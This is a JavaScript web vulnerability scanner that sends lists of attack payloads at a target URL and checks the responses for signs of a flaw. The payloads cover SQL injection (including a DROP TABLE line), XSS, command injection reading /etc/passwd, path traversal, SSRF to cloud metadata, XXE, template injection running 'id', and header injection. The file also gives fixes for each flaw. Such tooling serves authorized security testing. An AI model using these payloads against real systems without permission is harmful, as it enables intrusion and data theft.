/**
 * AEGIS AI - Real Vulnerability Scanner
 * 
 * WARNING: This tool is for authorized security testing only.
 * Never use on systems without explicit permission.
 */

// ============== PAYLOADS ==============

// SQL Injection payloads
const SQL_PAYLOADS = [
  "' OR '1'='1",
  "' OR '1'='1' --",
  "' OR '1'='1' /*",
  "1' OR '1'='1",
  "' UNION SELECT NULL--",
  "' UNION SELECT NULL, NULL--",
  "1; DROP TABLE users--",
  "' AND 1=1--",
  "' AND 1=2--",
  "admin'--",
  "1' AND SLEEP(5)--",
  "1' WAITFOR DELAY '0:0:5'--"
];

// XSS payloads
const XSS_PAYLOADS = [
  "<script>alert('XSS')</script>",
  "<img src=x onerror=alert('XSS')>",
  "<svg onload=alert('XSS')>",
  "javascript:alert('XSS')",
  "<body onload=alert('XSS')>",
  "'><script>alert('XSS')</script>",
  "\"><script>alert('XSS')</script>",
  "<iframe src=\"javascript:alert('XSS')\">",
  "<input onfocus=alert('XSS') autofocus>",
  "<marquee onstart=alert('XSS')>"
];

// Command Injection payloads
const CMD_PAYLOADS = [
  "; ls -la",
  "| ls -la",
  "& ls -la",
  "`ls -la`",
  "$(ls -la)",
  "; cat /etc/passwd",
  "| cat /etc/passwd",
  "; whoami",
  "| whoami",
  "&& whoami"
];

// Path Traversal payloads
const PATH_PAYLOADS = [
  "../../../etc/passwd",
  "....//....//....//etc/passwd",
  "..\\..\\..\\windows\\system32\\config\\sam",
  "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
  "..%252f..%252f..%252fetc/passwd",
  "/etc/passwd",
  "....//....//....//....//etc/passwd%00",
  "..%c0%af..%c0%af..%c0%afetc/passwd"
];

// SSRF payloads
const SSRF_PAYLOADS = [
  "http://localhost",
  "http://127.0.0.1",
  "http://[::1]",
  "http://localhost:22",
  "http://localhost:3306",
  "http://localhost:6379",
  "http://169.254.169.254/latest/meta-data/",
  "http://metadata.google.internal/",
  "http://192.168.1.1",
  "http://10.0.0.1",
  "file:///etc/passwd"
];

// XXE payloads
const XXE_PAYLOADS = [
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:8080">]><foo>&xxe;</foo>',
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>',
  '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///c:/windows/win.ini">]><data>&file;</data>'
];

// SSTI payloads (Server-Side Template Injection)
const SSTI_PAYLOADS = [
  "{{7*7}}",
  "${7*7}",
  "<%= 7*7 %>",
  "#{7*7}",
  "*{7*7}",
  "{{config}}",
  "{{self.__class__.__mro__}}",
  "${T(java.lang.Runtime).getRuntime().exec('whoami')}",
  "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
  "{php}echo `id`;{/php}"
];

// Open Redirect payloads
const OPEN_REDIRECT_PAYLOADS = [
  "//evil.com",
  "https://evil.com",
  "/\\evil.com",
  "////evil.com",
  "https:evil.com",
  "//evil.com/%2f..",
  "///evil.com",
  "\\\\evil.com",
  "/\\/evil.com",
  "https://evil.com@legitimate.com"
];

// NoSQL Injection payloads
const NOSQL_PAYLOADS = [
  '{"$gt": ""}',
  '{"$ne": null}',
  '{"$ne": ""}',
  "admin'||'1'=='1",
  '{"$where": "1==1"}',
  '{"$regex": ".*"}',
  "true, $where: '1 == 1'",
  "'; return '' == '",
  '{"$or": [{}]}',
  '[$ne]=1'
];

// LDAP Injection payloads
const LDAP_PAYLOADS = [
  "*",
  "*)(&",
  "*)(uid=*))(|(uid=*",
  "admin)(&)",
  "admin)(|(password=*))",
  "*)(objectClass=*",
  "x*)(|(objectClass=*",
  "*))%00",
  "*()|%26'",
  "admin)(!(&(1=0"
];

// CRLF Injection payloads
const CRLF_PAYLOADS = [
  "%0d%0aSet-Cookie:hacked=true",
  "%0aSet-Cookie:hacked=true",
  "%0d%0aHeader-Injection:true",
  "\\r\\nSet-Cookie:hacked=true",
  "%E5%98%8A%E5%98%8DSet-Cookie:hacked=true",
  "%0d%0a%0d%0a<html>Injected</html>",
  "\\r\\n\\r\\n<script>alert(1)</script>",
  "%0d%0aLocation:http://evil.com"
];

// Host Header Injection payloads
const HOST_HEADER_PAYLOADS = [
  "evil.com",
  "localhost",
  "127.0.0.1",
  "evil.com:80@legitimate.com",
  "legitimate.com.evil.com",
  "evil.com#@legitimate.com",
  "evil.com?.legitimate.com"
];

// ============== SIGNATURES ==============

// SQL error signatures
const SQL_ERROR_SIGNATURES = [
  'sql syntax',
  'mysql_fetch',
  'mysqli_',
  'pg_query',
  'sqlite3',
  'ORA-',
  'Oracle error',
  'SQL Server',
  'ODBC Driver',
  'syntax error',
  'unclosed quotation',
  'quoted string not properly terminated',
  'SQL command not properly ended',
  'unexpected end of SQL',
  'Invalid query',
  'Query failed',
  'Database error',
  'db error',
  'Warning: mysql',
  'Warning: pg_',
  'Warning: SQLite',
  'PDOException',
  'SQLSTATE',
  'Microsoft OLE DB',
  'Incorrect syntax near',
  'Unclosed quotation mark',
  'You have an error in your SQL syntax'
];

// XSS reflection indicators
const XSS_REFLECTION_PATTERNS = [
  /<script[^>]*>alert\(/i,
  /onerror\s*=\s*alert\(/i,
  /onload\s*=\s*alert\(/i,
  /javascript:\s*alert\(/i,
  /<svg[^>]*onload/i,
  /<img[^>]*onerror/i,
  /<iframe[^>]*src\s*=\s*["']?javascript:/i
];

// Command injection indicators
const CMD_INJECTION_SIGNATURES = [
  'root:x:0:0',
  '/bin/bash',
  '/bin/sh',
  'uid=',
  'gid=',
  'groups=',
  'drwx',
  '-rw-',
  'total ',
  'daemon:x:',
  'nobody:x:',
  'www-data'
];

// Path traversal indicators
const PATH_TRAVERSAL_SIGNATURES = [
  'root:x:0:0',
  '[boot loader]',
  '[operating systems]',
  'daemon:x:',
  'bin:x:',
  '/bin/bash',
  '/bin/sh',
  'SAM',
  'SYSTEM'
];

// SSRF indicators
const SSRF_SIGNATURES = [
  'ami-id',
  'instance-id',
  'local-hostname',
  'metadata',
  'localhost',
  '127.0.0.1',
  'internal',
  'private',
  'Connection refused',
  'computeMetadata'
];

// XXE indicators
const XXE_SIGNATURES = [
  'root:x:0:0',
  'daemon:x:',
  'ENTITY',
  'DOCTYPE',
  '[extensions]',
  'fonts',
  'boot loader'
];

// SSTI indicators
const SSTI_SIGNATURES = [
  '49',
  'config',
  '__class__',
  '__mro__',
  'subprocess',
  'Popen',
  'Runtime',
  'Process'
];

// NoSQL Injection indicators
const NOSQL_SIGNATURES = [
  'MongoError',
  'CastError',
  'ValidationError',
  '$where',
  'SyntaxError',
  'BSONTypeError'
];

// LDAP Injection indicators
const LDAP_SIGNATURES = [
  'LDAP error',
  'ldap_search',
  'Invalid DN syntax',
  'Bad search filter',
  'Size limit exceeded'
];

// CRLF Injection indicators
const CRLF_SIGNATURES = [
  'Set-Cookie',
  'hacked=true',
  'Header-Injection'
];

// ============== HELPERS ==============

async function makeRequest(url, method = 'GET', payload = null, customHeaders = {}) {
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 10000);

  try {
    const options = {
      method,
      signal: controller.signal,
      headers: {
        'User-Agent': 'AEGIS-Security-Scanner/1.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'close',
        ...customHeaders
      },
      redirect: 'manual'
    };

    if (method === 'POST' && payload) {
      options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
      options.body = payload;
    }

    const response = await fetch(url, options);
    const text = await response.text();

    return {
      statusCode: response.status,
      headers: Object.fromEntries(response.headers.entries()),
      body: text,
      url: response.url
    };
  } catch (error) {
    if (error.name === 'AbortError') {
      throw new Error('Request timeout');
    }
    throw error;
  } finally {
    clearTimeout(timeout);
  }
}

function injectPayloadIntoUrl(baseUrl, payload) {
  const url = new URL(baseUrl);
  const injectedUrls = [];

  if (url.search) {
    for (const [key] of url.searchParams) {
      const newUrl = new URL(baseUrl);
      newUrl.searchParams.set(key, payload);
      injectedUrls.push({ url: newUrl.toString(), param: key, type: 'query' });
    }
  }

  const testParams = ['id', 'q', 'search', 'url', 'redirect', 'next', 'file', 'path', 'page', 'data'];
  for (const param of testParams) {
    const testUrl = new URL(baseUrl);
    testUrl.searchParams.set(param, payload);
    injectedUrls.push({ url: testUrl.toString(), param, type: 'query' });
  }

  return injectedUrls;
}

// ============== CHECK FUNCTIONS ==============

function checkSqlInjection(response, payload) {
  const bodyLower = response.body.toLowerCase();
  for (const signature of SQL_ERROR_SIGNATURES) {
    if (bodyLower.includes(signature.toLowerCase())) {
      return { found: true, evidence: signature, type: 'SQL Error Message' };
    }
  }
  return { found: false };
}

function checkXss(response, payload) {
  if (response.body.includes(payload)) {
    return { found: true, evidence: 'Payload reflected without encoding', type: 'Reflected XSS' };
  }
  for (const pattern of XSS_REFLECTION_PATTERNS) {
    if (pattern.test(response.body)) {
      return { found: true, evidence: 'XSS pattern detected in response', type: 'Reflected XSS' };
    }
  }
  return { found: false };
}

function checkCommandInjection(response, payload) {
  for (const signature of CMD_INJECTION_SIGNATURES) {
    if (response.body.includes(signature)) {
      return { found: true, evidence: signature, type: 'Command Output Detected' };
    }
  }
  return { found: false };
}

function checkPathTraversal(response, payload) {
  for (const signature of PATH_TRAVERSAL_SIGNATURES) {
    if (response.body.includes(signature)) {
      return { found: true, evidence: signature, type: 'Sensitive File Content' };
    }
  }
  return { found: false };
}

function checkSsrf(response, payload) {
  for (const signature of SSRF_SIGNATURES) {
    if (response.body.toLowerCase().includes(signature.toLowerCase())) {
      return { found: true, evidence: signature, type: 'Internal Service Response' };
    }
  }
  if (response.statusCode === 200 && payload.includes('169.254.169.254')) {
    return { found: true, evidence: 'AWS Metadata endpoint accessible', type: 'Cloud Metadata Access' };
  }
  return { found: false };
}

function checkXxe(response, payload) {
  for (const signature of XXE_SIGNATURES) {
    if (response.body.includes(signature)) {
      return { found: true, evidence: signature, type: 'XXE Data Exfiltration' };
    }
  }
  return { found: false };
}

function checkSsti(response, payload) {
  if (payload.includes('7*7') && response.body.includes('49')) {
    return { found: true, evidence: 'Template expression evaluated (49)', type: 'Template Injection' };
  }
  for (const signature of SSTI_SIGNATURES) {
    if (response.body.includes(signature)) {
      return { found: true, evidence: signature, type: 'Template Engine Exposed' };
    }
  }
  return { found: false };
}

function checkOpenRedirect(response, payload) {
  if ([301, 302, 303, 307, 308].includes(response.statusCode)) {
    const location = response.headers['location'] || '';
    if (location.includes('evil.com') || location.includes(payload)) {
      return { found: true, evidence: `Redirect to: ${location}`, type: 'Open Redirect' };
    }
  }
  if (response.body.toLowerCase().includes('evil.com')) {
    return { found: true, evidence: 'Malicious URL in response', type: 'Open Redirect' };
  }
  return { found: false };
}

function checkNoSqlInjection(response, payload) {
  for (const signature of NOSQL_SIGNATURES) {
    if (response.body.includes(signature)) {
      return { found: true, evidence: signature, type: 'NoSQL Error Message' };
    }
  }
  return { found: false };
}

function checkLdapInjection(response, payload) {
  for (const signature of LDAP_SIGNATURES) {
    if (response.body.toLowerCase().includes(signature.toLowerCase())) {
      return { found: true, evidence: signature, type: 'LDAP Error Message' };
    }
  }
  return { found: false };
}

function checkCrlfInjection(response, payload) {
  for (const [key, value] of Object.entries(response.headers)) {
    if (key.toLowerCase().includes('hacked') || value.includes('hacked')) {
      return { found: true, evidence: 'Injected header found', type: 'Header Injection' };
    }
  }
  for (const signature of CRLF_SIGNATURES) {
    if (response.body.includes(signature)) {
      return { found: true, evidence: signature, type: 'CRLF in Response' };
    }
  }
  return { found: false };
}

function checkHostHeaderInjection(response, payload, originalHost) {
  if (response.body.includes(payload) && payload !== originalHost) {
    return { found: true, evidence: `Host header reflected: ${payload}`, type: 'Host Header Reflected' };
  }
  if (response.body.toLowerCase().includes('reset') && response.body.includes(payload)) {
    return { found: true, evidence: 'Password reset link poisoned', type: 'Host Header Poisoning' };
  }
  return { found: false };
}

// ============== SEVERITY ==============

function determineSeverity(vulnType) {
  const severityMap = {
    'SQL Injection': 'Critical',
    'XSS (Cross-Site Scripting)': 'High',
    'Command Injection': 'Critical',
    'Path Traversal': 'High',
    'SSRF (Server-Side Request Forgery)': 'Critical',
    'XXE (XML External Entity)': 'Critical',
    'SSTI (Server-Side Template Injection)': 'Critical',
    'Open Redirect': 'Medium',
    'NoSQL Injection': 'Critical',
    'LDAP Injection': 'High',
    'CRLF Injection': 'Medium',
    'Host Header Injection': 'Medium'
  };
  return severityMap[vulnType] || 'Medium';
}

// ============== MAIN SCANNER ==============

export async function scanTarget({ targetUrl, vulnType, payload }) {
  const results = {
    vulnerability_found: false,
    severity: 'Low',
    findings: [],
    rawResponses: [],
    testedPayloads: [],
    analysis: '',
    fix_suggestion: ''
  };

  let payloads = [payload];
  let checkFunction;

  switch (vulnType) {
    case 'SQL Injection':
      payloads = SQL_PAYLOADS.slice(0, 5);
      checkFunction = checkSqlInjection;
      break;
    case 'XSS (Cross-Site Scripting)':
      payloads = XSS_PAYLOADS.slice(0, 5);
      checkFunction = checkXss;
      break;
    case 'Command Injection':
      payloads = CMD_PAYLOADS.slice(0, 5);
      checkFunction = checkCommandInjection;
      break;
    case 'Path Traversal':
      payloads = PATH_PAYLOADS.slice(0, 5);
      checkFunction = checkPathTraversal;
      break;
    case 'SSRF (Server-Side Request Forgery)':
      payloads = SSRF_PAYLOADS.slice(0, 5);
      checkFunction = checkSsrf;
      break;
    case 'XXE (XML External Entity)':
      payloads = XXE_PAYLOADS.slice(0, 4);
      checkFunction = checkXxe;
      break;
    case 'SSTI (Server-Side Template Injection)':
      payloads = SSTI_PAYLOADS.slice(0, 5);
      checkFunction = checkSsti;
      break;
    case 'Open Redirect':
      payloads = OPEN_REDIRECT_PAYLOADS.slice(0, 5);
      checkFunction = checkOpenRedirect;
      break;
    case 'NoSQL Injection':
      payloads = NOSQL_PAYLOADS.slice(0, 5);
      checkFunction = checkNoSqlInjection;
      break;
    case 'LDAP Injection':
      payloads = LDAP_PAYLOADS.slice(0, 5);
      checkFunction = checkLdapInjection;
      break;
    case 'CRLF Injection':
      payloads = CRLF_PAYLOADS.slice(0, 5);
      checkFunction = checkCrlfInjection;
      break;
    case 'Host Header Injection':
      payloads = HOST_HEADER_PAYLOADS.slice(0, 5);
      checkFunction = (response, payload) => checkHostHeaderInjection(response, payload, new URL(targetUrl).host);
      break;
    default:
      payloads = [payload];
      checkFunction = checkSqlInjection;
  }

  let baselineResponse;
  try {
    baselineResponse = await makeRequest(targetUrl);
    console.log(`[SCAN] Baseline response: ${baselineResponse.statusCode}`);
  } catch (error) {
    console.log(`[SCAN] Baseline request failed: ${error.message}`);
    results.analysis = `Could not reach target: ${error.message}`;
    return results;
  }

  for (const testPayload of payloads) {
    results.testedPayloads.push(testPayload);

    if (vulnType === 'Host Header Injection') {
      try {
        console.log(`[SCAN] Testing Host Header: ${testPayload}`);
        const response = await makeRequest(targetUrl, 'GET', null, { 'Host': testPayload });
        
        results.rawResponses.push({
          payload: testPayload,
          param: 'Host Header',
          statusCode: response.statusCode,
          bodyLength: response.body.length,
          snippet: response.body.substring(0, 500)
        });

        const check = checkFunction(response, testPayload);
        if (check.found) {
          results.vulnerability_found = true;
          results.severity = determineSeverity(vulnType);
          results.findings.push({
            payload: testPayload,
            parameter: 'Host Header',
            evidence: check.evidence,
            type: check.type,
            statusCode: response.statusCode
          });
          results.analysis = generateAnalysis(vulnType, targetUrl, testPayload, check, response);
          results.fix_suggestion = generateFixSuggestion(vulnType);
          return results;
        }
      } catch (error) {
        console.log(`[SCAN] Request failed: ${error.message}`);
      }
      continue;
    }

    if (vulnType === 'XXE (XML External Entity)') {
      try {
        console.log(`[SCAN] Testing XXE payload`);
        const response = await makeRequest(targetUrl, 'POST', testPayload, {
          'Content-Type': 'application/xml'
        });
        
        results.rawResponses.push({
          payload: testPayload.substring(0, 100) + '...',
          param: 'XML Body',
          statusCode: response.statusCode,
          bodyLength: response.body.length,
          snippet: response.body.substring(0, 500)
        });

        const check = checkFunction(response, testPayload);
        if (check.found) {
          results.vulnerability_found = true;
          results.severity = determineSeverity(vulnType);
          results.findings.push({
            payload: testPayload,
            parameter: 'XML Body',
            evidence: check.evidence,
            type: check.type,
            statusCode: response.statusCode
          });
          results.analysis = generateAnalysis(vulnType, targetUrl, testPayload, check, response);
          results.fix_suggestion = generateFixSuggestion(vulnType);
          return results;
        }
      } catch (error) {
        console.log(`[SCAN] Request failed: ${error.message}`);
      }
      continue;
    }

    const injectedUrls = injectPayloadIntoUrl(targetUrl, testPayload);

    for (const injection of injectedUrls) {
      try {
        console.log(`[SCAN] Testing: ${injection.url.substring(0, 100)}...`);
        
        const response = await makeRequest(injection.url);
        
        results.rawResponses.push({
          payload: testPayload,
          param: injection.param,
          statusCode: response.statusCode,
          bodyLength: response.body.length,
          snippet: response.body.substring(0, 500)
        });

        const check = checkFunction(response, testPayload);

        if (check.found) {
          results.vulnerability_found = true;
          results.severity = determineSeverity(vulnType);
          results.findings.push({
            payload: testPayload,
            parameter: injection.param,
            evidence: check.evidence,
            type: check.type,
            statusCode: response.statusCode
          });
          results.analysis = generateAnalysis(vulnType, targetUrl, testPayload, check, response);
          results.fix_suggestion = generateFixSuggestion(vulnType);
          return results;
        }

        await new Promise(resolve => setTimeout(resolve, 200));

      } catch (error) {
        console.log(`[SCAN] Request failed: ${error.message}`);
      }
    }
  }

  results.analysis = `
SCAN COMPLETE: No ${vulnType} vulnerability detected.

Target: ${targetUrl}
Payloads Tested: ${payloads.length}

The application appears to properly handle the tested payloads. However, this does not guarantee the application is secure.
  `.trim();

  results.fix_suggestion = generateFixSuggestion(vulnType);
  return results;
}

function generateAnalysis(vulnType, targetUrl, payload, check, response) {
  return `
VULNERABILITY CONFIRMED: ${vulnType}

Target: ${targetUrl}
Payload Used: ${payload}

Evidence Found: ${check.evidence}
Detection Type: ${check.type}

HTTP Response Code: ${response.statusCode}
Response Length: ${response.body.length} bytes
  `.trim();
}

function generateFixSuggestion(vulnType) {
  const fixes = {
    'SQL Injection': `## Remediation for SQL Injection\n\n1. Use Parameterized Queries\n2. Use ORM/Query Builders\n3. Input validation with allowlists\n4. Least privilege database accounts`,
    'XSS (Cross-Site Scripting)': `## Remediation for XSS\n\n1. Output Encoding\n2. Content Security Policy (CSP)\n3. Use framework auto-escaping\n4. Sanitize with DOMPurify`,
    'Command Injection': `## Remediation for Command Injection\n\n1. Avoid system commands\n2. Use subprocess with argument lists\n3. Strict input validation\n4. Sandbox execution`,
    'Path Traversal': `## Remediation for Path Traversal\n\n1. Validate and canonicalize paths\n2. Use allowlists for file access\n3. Chroot/jail the application`,
    'SSRF (Server-Side Request Forgery)': `## Remediation for SSRF\n\n1. Validate and allowlist URLs\n2. Block internal IP ranges\n3. Use a proxy for outbound requests\n4. Disable file:// and other schemes`,
    'XXE (XML External Entity)': `## Remediation for XXE\n\n1. Disable external entities\n2. Use JSON instead of XML\n3. Update XML libraries\n4. Disable DTD processing`,
    'SSTI (Server-Side Template Injection)': `## Remediation for SSTI\n\n1. Never pass user input to templates\n2. Use logic-less templates\n3. Sandbox template execution\n4. Validate input strictly`,
    'Open Redirect': `## Remediation for Open Redirect\n\n1. Validate redirects against allowlist\n2. Use relative URLs only\n3. Verify URL starts with your domain`,
    'NoSQL Injection': `## Remediation for NoSQL Injection\n\n1. Use parameterized queries\n2. Validate input types strictly\n3. Sanitize operators ($gt, $ne)\n4. Use ODM with schema validation`,
    'LDAP Injection': `## Remediation for LDAP Injection\n\n1. Escape special LDAP characters\n2. Use parameterized LDAP queries\n3. Validate input strictly`,
    'CRLF Injection': `## Remediation for CRLF Injection\n\n1. Strip CR/LF characters\n2. Use framework header methods\n3. Validate header values`,
    'Host Header Injection': `## Remediation for Host Header Injection\n\n1. Configure allowed hosts\n2. Don't use Host header for URLs\n3. Use absolute URLs from config`
  };
  return fixes[vulnType] || 'Implement proper input validation and output encoding.';
}
